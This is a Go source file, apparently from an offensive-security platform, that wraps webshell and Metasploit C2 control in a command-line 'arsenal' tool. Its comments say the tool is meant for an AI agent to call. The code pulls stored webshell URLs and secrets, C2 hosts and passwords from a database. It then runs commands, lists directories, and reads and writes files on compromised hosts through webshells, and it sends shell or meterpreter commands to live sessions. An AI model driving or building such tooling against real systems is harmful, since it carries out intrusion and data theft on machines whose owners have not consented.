package main

// arsenal 子命令：把 C2 / Webshell 能力暴露成命令行，供平台的「命令型自定义工具」
// 包装后交给 agent 调用。刻意不经过 HTTP API —— 少一跳、少一个鉴权面，
// 也让 agent 拿到的输出是干净文本而不是 JSON 信封。

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/Kur1sulab/lance/config"
	"github.com/Kur1sulab/lance/db"
	"github.com/Kur1sulab/lance/internal/engine/msf"
	"github.com/Kur1sulab/lance/internal/engine/webshell"
)

func openPG() (*db.DB, error) {
	dsn, _, err := config.PostgresDSN()
	if err != nil {
		return nil, err
	}
	return db.Open(dsn)
}

func cmdArsenal(ctx context.Context, argv []string) {
	if len(argv) == 0 {
		fmt.Fprintln(os.Stderr, "用法: lance arsenal <shell|c2> [参数]")
		os.Exit(2)
	}
	switch argv[0] {
	case "shell":
		arsenalShell(ctx, argv[1:])
	case "c2":
		arsenalC2(ctx, argv[1:])
	default:
		fmt.Fprintf(os.Stderr, "未知子命令 %q\n", argv[0])
		os.Exit(2)
	}
}

func arsenalShell(ctx context.Context, argv []string) {
	fs := flag.NewFlagSet("arsenal shell", flag.ExitOnError)
	id := fs.Int64("id", 0, "shell 记录 id")
	op := fs.String("op", "exec", "ping|exec|ls|read|write")
	cmd := fs.String("cmd", "", "命令")
	path := fs.String("path", "", "路径（ls/read/write）")
	content := fs.String("content", "", "写入内容（write）")
	fs.Parse(argv)

	if *id == 0 {
		fmt.Fprintln(os.Stderr, "必须给 --id")
		os.Exit(2)
	}
	pg, err := openPG()
	if err != nil {
		fmt.Fprintln(os.Stderr, "数据库打开失败:", err)
		os.Exit(1)
	}
	defer pg.Close()

	var x webshell.Config
	var taskID string
	err = pg.QueryRowContext(ctx, `SELECT url, kind, secret, header, body, insecure, task_id FROM shells WHERE id=$1`, *id).
		Scan(&x.URL, &x.Kind, &x.Secret, new([]byte), &x.Body, &x.Insecure, &taskID)
	if err != nil {
		fmt.Fprintln(os.Stderr, "读不到该 shell:", err)
		os.Exit(1)
	}
	// header 单独取一次，避免上面 Scan 类型不匹配
	var hdr []byte
	_ = pg.QueryRowContext(ctx, `SELECT header FROM shells WHERE id=$1`, *id).Scan(&hdr)
	x.Header = map[string]string{}
	_ = json.Unmarshal(hdr, &x.Header)

	cctx, cancel := context.WithTimeout(ctx, 60*time.Second)
	defer cancel()

	var out string
	switch *op {
	case "ping":
		out, err = x.Ping(cctx)
	case "exec":
		out, err = x.Exec(cctx, *cmd)
	case "ls":
		out, err = x.ListDir(cctx, *path)
	case "read":
		out, err = x.ReadFile(cctx, *path)
	case "write":
		out, err = x.WriteFile(cctx, *path, []byte(*content))
	default:
		fmt.Fprintln(os.Stderr, "未知 op:", *op)
		os.Exit(2)
	}
	status := "alive"
	if err != nil {
		status = "dead"
	}
	_, _ = pg.ExecContext(context.Background(),
		`UPDATE shells SET status=$2, last_check=now(), last_output=$3 WHERE id=$1`, *id, status, truncate(out, 4000))
	if err != nil {
		fmt.Fprintf(os.Stderr, "失败(状态=%s): %v\n", status, err)
		os.Exit(1)
	}
	fmt.Println(strings.TrimSpace(out))
}

func arsenalC2(ctx context.Context, argv []string) {
	fs := flag.NewFlagSet("arsenal c2", flag.ExitOnError)
	engineID := fs.Int64("engine", 0, "c2_engines.id")
	op := fs.String("op", "sessions", "sessions|jobs|exec")
	session := fs.String("session", "", "会话 id")
	cmd := fs.String("cmd", "", "命令")
	meter := fs.Bool("meterpreter", false, "走 meterpreter 通道")
	fs.Parse(argv)

	pg, err := openPG()
	if err != nil {
		fmt.Fprintln(os.Stderr, "数据库打开失败:", err)
		os.Exit(1)
	}
	defer pg.Close()

	var kind, base, user, pass string
	q := `SELECT kind, base_url, username, password FROM c2_engines WHERE id=$1`
	if *engineID == 0 {
		q = `SELECT kind, base_url, username, password FROM c2_engines ORDER BY id LIMIT 1`
		err = pg.QueryRowContext(ctx, q).Scan(&kind, &base, &user, &pass)
	} else {
		err = pg.QueryRowContext(ctx, q, *engineID).Scan(&kind, &base, &user, &pass)
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, "没有可用的 C2 引擎（先在武器库里添加）:", err)
		os.Exit(1)
	}
	c := msf.New(base, user, pass)
	cctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	switch *op {
	case "sessions":
		sess, err := c.Sessions(cctx)
		if err != nil {
			fmt.Fprintln(os.Stderr, "拉会话失败:", err)
			os.Exit(1)
		}
		if len(sess) == 0 {
			fmt.Println("（当前没有在线会话）")
			return
		}
		for _, s := range sess {
			fmt.Printf("%s\t%s\t%s\t%s\t%s\n", s.ID, s.Type, s.TunnelPeer, s.Username, s.Platform)
		}
	case "jobs":
		jobs, err := c.Jobs(cctx)
		if err != nil {
			fmt.Fprintln(os.Stderr, "拉监听器失败:", err)
			os.Exit(1)
		}
		if len(jobs) == 0 {
			fmt.Println("（没有后台 job）")
			return
		}
		for id, j := range jobs {
			fmt.Printf("%s\t%v\n", id, j["name"])
		}
	case "exec":
		if *session == "" || *cmd == "" {
			fmt.Fprintln(os.Stderr, "exec 需要 --session 和 --cmd")
			os.Exit(2)
		}
		var werr error
		if *meter {
			werr = c.MeterpreterWrite(cctx, *session, *cmd)
		} else {
			werr = c.ShellWrite(cctx, *session, *cmd)
		}
		if werr != nil {
			fmt.Fprintln(os.Stderr, "下发失败:", werr)
			os.Exit(1)
		}
		time.Sleep(1500 * time.Millisecond)
		var out string
		if *meter {
			out, _ = c.MeterpreterRead(cctx, *session)
		} else {
			out, _ = c.ShellRead(cctx, *session)
		}
		fmt.Println(strings.TrimSpace(out))
	default:
		fmt.Fprintln(os.Stderr, "未知 op:", *op)
		os.Exit(2)
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
